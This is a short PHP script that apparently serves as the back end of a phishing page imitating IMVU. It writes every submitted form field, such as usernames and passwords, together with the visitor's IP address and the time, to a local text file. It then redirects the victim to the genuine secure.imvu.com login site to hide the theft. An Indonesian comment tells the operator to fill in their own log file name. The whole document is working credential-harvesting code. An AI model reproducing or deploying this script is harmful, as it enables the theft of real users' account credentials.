<?php

$datum = date('d-m-Y / H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
header('Location: https://secure.imvu.com');
$handle = fopen('jejok.txt', "a"); //ISI dengan Nama TXT anda 
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "IP: $ip | Date: $datum (Date=0 GTM)\r\n");
fwrite($handle, "\r\n");
fclose($handle);

setcookie ("user", "empty", time()+3600);
exit;
?> 
